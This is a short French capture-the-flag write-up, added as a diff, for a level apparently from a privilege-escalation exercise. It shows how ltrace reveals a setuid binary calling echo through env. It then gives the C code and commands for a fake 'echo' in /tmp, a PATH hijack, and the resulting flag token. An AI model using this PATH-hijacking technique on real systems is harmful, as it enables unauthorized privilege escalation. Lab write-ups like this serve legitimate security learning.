@@ -1,0 +1,38 @@
+Level03 :
+
+on se connecte avec le flag02
+
+on se place dans le home : cd 
+
+on inspecte l'ensemble des dossiers et fichiers et leur droitsb : ls -la
+
+on peut voir un executable : level03
+
+quand on l'execute, on obtient le message : "exploit me"
+
+via la commande ltrace, on peut voir l'ensemble des fonctions appelées par l'executable
+
+on s'interresse à cette ligne : system("/usr/bin/env echo Exploit me"Exploit me
+
+on essaie de tromper le systeme en créant notre propre fonction echo et remplacant le path pour aller chercher l'executable
+
+se placer dans /tmp pour creer notre fichier
+
+—> vi main.c
+
+—>	int main()
+	{
+		system ("bin/getflag");
+		return (0);
+	}
+
+—> gcc main.c -o echo
+
+retour sur le home pour changer le path
+—> export PATH=/tmp:$PATH
+
+on lance l'executable 
+—> ./level03
+
+on obtient 
+—> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
